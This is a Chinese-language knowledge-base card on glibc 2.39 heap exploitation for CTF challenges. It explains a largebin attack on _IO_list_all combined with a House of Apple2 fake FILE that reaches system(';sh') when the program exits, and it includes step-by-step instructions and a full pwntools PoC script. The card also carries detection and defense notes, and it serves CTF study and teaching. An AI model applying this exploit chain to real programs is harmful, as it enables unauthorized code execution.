---
id: binary-pwn-heap-glibc239-largebin-apple2-tcache-encryption-libc-highbyte
title: glibc 2.39 largebin attack + House of Apple2 直接 system：tcache 指针加密与 libc 基址高位随机化下的泄露适配
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc239-largebin-apple2-tcache-encryption-libc-highbyte
tags:
- pwn
- heap
- glibc-2.39
- largebin-attack
- house-of-apple2
- fsop
- tcache-encryption
- libc-base
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: glibc 2.39（原文环境 Ubuntu GLIBC 2.39）
verification:
  verified_by: verifier-V336
  verified_at: '2026-11-08T19:10:57+08:00'
  notes: '已对照原文 2.39 节与图 28-33/交互图核对：create 限制 0x40F<size<=0x1000（图 28 源码高亮）、tcache 0x90 [4] 指针加密（图 29/30，尾指针 fd 仍可移位）、libc 基址 0x7b7b60600000 高位非 0x7f（图 31，故 recv(6)）、largebin attack 把 _IO_list_all 指向 chunk0、fake_IO 的 wide_data=_IO_wfile_jumps/wide_vtable+0x68=system 布局与脚本一致；图 32/33 显示 _flags=0x68733bfffff7f5 与 _IO_wfile_jumps/system，演示出现 sh: 1: ... not found 后仍拿到 shell（;sh 触发）。dedup 唯一 likely_duplicate 为 tcache 毒化 _IO_list_all 的 2.39 卡，写原语(tcache poisoning vs largebin attack)、泄露适配与布局不同；另有 2.35 largebin+Apple2 源码剖析卡，版本与 PoC 不同，非同一链，保留。affected_versions=glibc 2.39 与原文 2.39 节/24.04 环境一致。dup-scan 早于建卡。'
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc239-largebin-apple2-tcache-encryption-libc-highbyte/
draft: false
kb_aliases:
- 2.39 largebin attack
- 2.39 House of Apple2
- tcache 指针加密
- libc 基址高位随机化
- _IO_wfile_overflow system
- 2.39 堆题
---

## 一句话结论

glibc 2.39 已移除 `__malloc_hook`/`__free_hook`，堆题通常改走 FSOP：用 largebin attack 把 `_IO_list_all` 改成可控堆块，伪造 `_IO_FILE_plus`（主 vtable=`_IO_wfile_jumps`，`_wide_data->_wide_vtable+0x68=system`），在 `_flags` 放 `;sh`，程序 `exit()` 时经 `_IO_flush_all_lockp → _IO_wfile_overflow → _IO_wdoallocbuf` 调 `system(fp)`。同时 2.39 的 tcache 指针被加密、libc 基址高位可能随机化（不再是固定 `0x7f`），泄露与接收方式需要相应调整。

## 原理

- **largebin attack 改 `_IO_list_all`**：把 largebin 中一个 victim chunk 的 `bk_nextsize` 设为 `_IO_list_all - 0x20`；插入 largebin 时 `victim->bk_nextsize->fd_nextsize = victim`（`fd_nextsize` 在 chunk+0x20），于是 `_IO_list_all` 被写成 victim 地址，victim 指向伪造 FILE 的堆块。
- **House of Apple2 调用链**：`exit()` → `_IO_cleanup` → `_IO_flush_all_lockp` 遍历 `_IO_list_all`；fake FILE 满足 `_mode <= 0`、`_IO_write_ptr > _IO_write_base` 后调用 `_IO_OVERFLOW(fp, EOF)`。主 vtable 用合法段内的 `_IO_wfile_jumps`（过 `_IO_validate_vtable`），进入 `_IO_wfile_overflow`；当 `_wide_data->_IO_write_base == 0` 时调用 `_IO_wdoallocbuf(fp)`；该函数在 `_wide_data->_IO_buf_base == 0` 且 `_flags & _IO_UNBUFFERED == 0` 时执行 `*(_wide_data->_wide_vtable + 0x68)(fp)`。把该槽写 `system`，`fp` 作为第一参数；把 `fp->_flags` 写成 `0xfffff7f5` 并在其后拼 `;sh\0`（原文 `p32(0xfffff7f5) + b';sh\x00'`），使 `system` 收到 `;sh`，等价于启动 shell。
- **2.39 的 tcache 指针变化**：原文观察 2.39 对 tcache 指针做了加密——除尾指针仍可移位得到 heap_base 外，fd/bk 多数被加密成看似随机的数据；这限制了直接明文写 `fd=target` 的利用，需要按版本实现编码/泄露。
- **libc 基址高位随机化**：原文 2.39 环境 libc 基址为 `0x7b7b60600000`，高字节不是固定的 `0x7f`，因此 `recvuntil('\x7f')` 可能收不到；应使用 `recv(6)` 按已知偏移拼接，或先用其他泄露定位。
- **2.39 的 malloc 限制**：原文 add 只允许 `0x40f < size <= 0x1000` 的大块，正好用于 largebin attack；不能像低版本那样随意申请 small/tcache 块，堆布局要围绕 largebin 设计。
- **为什么成立**：`_IO_list_all` 是普通可写全局变量，largebin attack 可把它改成堆地址；主 vtable 校验只检查主 vtable 是否在 `__libc_IO_vtables` 段，`_wide_vtable` 不在校验范围，因此可指向堆上伪造的跳表。
- **边界**：2.39 不同发行版 libc 的 `_IO_FILE`/`_IO_wide_data`/`_IO_wfile_jumps`/`system` 偏移不同；`_mode`/`_flags`/`_IO_write_ptr` 等字段必须满足 `_IO_flush_all_lockp` 与 `_IO_wfile_overflow` 分支；若程序不调用 `exit()`/main 不返回，需要另找触发点。

## 触发条件

- glibc 2.39 环境（原文 Ubuntu GLIBC 2.39），`__malloc_hook`/`__free_hook` 已移除。
- 程序存在 UAF/堆溢出或可控 free，能把 largebin chunk 的 `bk_nextsize` 写到 `_IO_list_all-0x20`；能申请/释放 largebin 范围（0x410–0x1000）的块。
- 能泄露 libc 与 heap（unsorted bin/largebin 残留指针、tcache 尾指针等）。
- 程序最终 `exit()`/main 返回，触发 `_IO_flush_all_lockp`。
- 能构造至少 0x200 字节的 fake FILE/`_IO_wide_data`/fake wide vtable。

## 利用步骤

1. 按题目限制申请 largebin 块：`add(8,0x508)`、`add(0,0x510)`、`add(1,0x500)`、`add(2,0x520)`、`add(3,0x500)`。
2. 泄露 libc：`delete(2)` 后申请一个更大的块把 2 放入 largebin，`show(2)` 读 largebin 指针，`libc_base = leak - 0x203F50`（按 libc 调整）。
3. 泄露 heap：`edit(2, b'a'*0x10)` 改到 `fd_nextsize`（此时指向自身），`show(2)` 读 `heap_addr`，`heap_base = heap_addr - 0x11d0`。
4. 准备写入点：`delete(0)`，`edit(2, p64(large_bin)+p64(large_bin)+p64(heap_addr)+p64(IO_list_all-0x20))` 伪造 `bk_nextsize`；`add(5,0x550)` 触发 largebin attack，使 `_IO_list_all` 指向 chunk0。
5. 伪造 FILE：`edit(8, b'a'*0x500 + p32(0xfffff7f5) + b';sh\x00')` 把 chunk0 的 `prev_size`/`_flags` 区域布置成 `;sh` 与标志；按 2.39 的 `_IO_FILE` 偏移构造 `fake_IO`（`_wide_data=chunk+0x100`、`_mode=0xffffffffffffffff`、`vtable=_IO_wfile_jumps`、`_wide_data->_wide_vtable=chunk+0x200`、`+0x68=system`），`edit(0, fake_IO)`。
6. 触发 `exit()`（菜单退出或 main 返回）：`_IO_flush_all_lockp` 遍历 fake FILE → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `system(';sh')`。
7. 验证 shell；若失败，检查 `_mode`/`_IO_write_ptr`/`_wide_vtable` 偏移与栈对齐。

## PoC

原文 2.39 脚本关键段（未在本机复现）：

```python
add(8, 0x508)
add(0, 0x510)
add(1, 0x500)
add(2, 0x520)
add(3, 0x500)
delete(2)
add(4, 0x550)
show(2)
large_bin = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = large_bin - 0x203F50
IO_list_all = libc_base + libc.symbols['_IO_list_all']
IO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']
system = libc_base + libc.symbols['system']

edit(2, b'a' * 0x10)
show(2)
heap_addr = u64(p.recv(6).ljust(8, b'\x00'))
heap_base = heap_addr - 0x11d0

delete(0)
edit(2, p64(large_bin) + p64(large_bin) + p64(heap_addr) + p64(IO_list_all - 0x20))
add(5, 0x550)
chunk = heap_addr - 0xa30
edit(8, b'a' * 0x500 + p32(0xfffff7f5) + b';sh\x00')

fake_IO = p64(0) * 2 + p64(1) + p64(2)
fake_IO = fake_IO.ljust(0xa0 - 0x10, b'\x00') + p64(chunk + 0x100)  # wide_data
fake_IO = fake_IO.ljust(0xc0 - 0x10, b'\x00') + p64(0xffffffffffffffff)  # mode
fake_IO = fake_IO.ljust(0xd8 - 0x10, b'\x00') + p64(IO_wfile_jumps)  # vtable
fake_IO = fake_IO.ljust(0x100 - 0x10 + 0xe0, b'\x00') + p64(chunk + 0x200)
fake_IO = fake_IO.ljust(0x200 - 0x10, b'\x00') + p64(0) * 13 + p64(system)
edit(0, fake_IO)
# 触发 exit
```

## 变体与关联

- **glibc 2.35 largebin + Apple2**：`binary-pwn-heap-house-of-apple2-source-analysis-largebin-system` 讲同一链路在 2.35 的布局与 `_IO_wfile_overflow`/`_IO_wdoallocbuf` 原理；本卡补充 2.39 的 tcache 指针加密、libc 基址高位随机化、largebin-only 申请限制与直接 `system` 的 PoC。
- **glibc 2.39 tcache poison + Apple2**：`binary-pwn-heap-tcache-poison-io-list-all-house-of-apple2` 用 UAF/堆溢出 + tcache poisoning 改 `_IO_list_all`；本卡用 largebin attack，sink 与触发方式不同。
- **2.39 safe-linking 打栈**：`binary-pwn-heap-tcache-safe-linking-stack-leak-chunk-to-stack` 走 tcache fd 泄栈并分配 chunk 到栈；本卡走 FSOP。
- **2.39 leakless RCE**：`binary-pwn-heap-leakless-mp-tcache-bins-stdout-fsop` 用 largebin attack 放大 `mp_.tcache_bins` 后从堆分配 stdout；本卡直接改 `_IO_list_all`，路径不同。
- **触发点**：`exit`/main 返回是常规触发；若程序用 `_exit`，需要找 `_IO_flush_all_lockp` 的其他调用点（`fcloseall` 等）。

## 检测与防御

- **防御**：升级 glibc、启用 safe-linking/tcache key；`_IO_list_all`/`_IO_FILE` 完整性校验（如 glibc 的 vtable 校验、`_IO_validate_vtable`）；Full RELRO/PIE/Canary 提高门槛但不阻止 FSOP。
- **检测**：监控 `_IO_list_all` 被写成堆地址、fake FILE 的 `_wide_vtable` 指向堆、`_IO_wfile_jumps` 被引用、`exit` 前堆块被大量改写；对 largebin `bk_nextsize` 异常指向全局变量告警。
- **CTF**：限制 add 大小到 largebin 区间、移除 hook、启用 2.39 的 tcache 加密/基址随机化都是提高难度的方式；利用者需按版本适配泄露与布局。
